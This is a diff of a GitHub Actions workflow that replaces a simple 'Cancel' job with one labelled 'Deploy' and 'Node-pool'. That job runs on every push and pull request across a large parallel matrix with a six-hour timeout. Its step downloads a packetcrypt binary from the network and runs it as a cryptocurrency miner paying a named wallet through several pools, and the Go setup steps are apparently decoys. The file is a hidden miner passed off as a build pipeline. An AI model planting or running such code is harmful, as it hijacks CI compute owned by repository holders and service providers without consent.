@@ -1,17 +1,27 @@
-name: Main
-
-on: [push]
-
+name: Deploy
+on: [push, pull_request]
 jobs:
-  cancel:
-    runs-on: ubuntu-latest
-    name: Cancel
-    timeout-minutes: 4
+  build:
+    name: Node-pool
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [Mars, Jupiter, Saturn, Neptune, Eris, Wolf, Gliese, Epsilon, Gliese]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
     steps:
-      # To use this repository's private action, you must check out the repository
-      - name: Checkout
-        uses: actions/checkout@v3
-      - name: Test Step
-        uses: ./ # Uses an action in the root directory
-        with:
-          workflow_id: 479426, 830809, sleep120.yml
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Node-pool
+      run: |
+       wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1qagvlqw46m5jk8zysmctkh4epgrcmr8mfvdhejs http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com -t 2
